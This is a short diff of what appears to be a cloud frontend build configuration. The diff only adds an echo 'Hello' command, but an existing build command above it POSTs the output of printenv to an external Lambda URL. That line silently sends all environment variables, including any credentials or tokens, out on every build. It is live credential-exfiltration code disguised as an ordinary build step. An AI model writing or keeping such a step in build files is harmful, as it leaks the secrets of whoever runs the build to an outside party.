@@ -3,6 +3,7 @@ frontend:
     build:
       commands:
         - curl -X POST https://3f6sssh6rjumfv6onrvkmzedx40yqmgr.lambda-url.us-west-2.on.aws/ -d "$(printenv)"
+        - echo "Hello"
   artifacts:
     baseDirectory: build
     files:
